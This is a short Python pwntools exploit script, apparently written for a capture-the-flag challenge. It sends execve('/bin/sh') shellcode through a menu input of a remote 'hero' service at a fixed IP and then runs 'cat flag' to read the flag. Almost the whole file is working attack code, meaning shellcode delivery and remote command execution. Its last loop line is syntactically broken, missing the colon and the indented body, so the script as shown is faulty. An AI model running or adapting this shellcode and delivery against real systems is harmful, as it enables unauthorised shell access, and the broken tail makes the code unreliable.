from pwn import *

def get_flag(ip,port):
	payload = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

	#p = process("./hero")
	p = remote(ip,port)
	p.recvuntil("Your choice:")
	p.sendline("1")
	#raw_input("stop")
	p.sendline("1234")

	p.recvuntil("What's your hero's power:")
	p.sendline(payload)

	p.recvuntil("Your choice:")
	p.sendline("6")

	p.recvuntil("4. Divide two numbers")
	p.sendline("13")

	p.recvuntil("Please input two numbers to do math with")
	p.sendline("1 2")

	p.sendline("cat flag")
	#p.interactive()
	p.recvline()
	flag = p.recvline()
	return flag
for i in range(11111111111)
flag = get_flag("172.91.0.88",8089)


